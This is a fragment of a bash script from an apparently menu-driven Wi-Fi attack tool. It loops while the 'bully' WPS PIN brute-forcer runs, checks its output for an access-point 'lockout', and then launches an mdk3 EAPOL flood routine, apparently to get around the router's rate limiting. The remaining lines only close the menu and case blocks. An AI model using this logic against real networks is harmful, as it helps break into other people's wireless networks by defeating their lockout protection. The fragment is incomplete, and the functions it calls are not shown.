while kill -0 $bully_pid ; do
    DETECT_RATE_LIMITING=`awk '/./{line=$0} END{print line}' BullyOutput.txt`
    if [[ $DETECT_RATE_LIMITING = *"lockout"* ]]; then
	run_mdk3_EAPOL5
    fi
    sleep 1
done
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;

esac
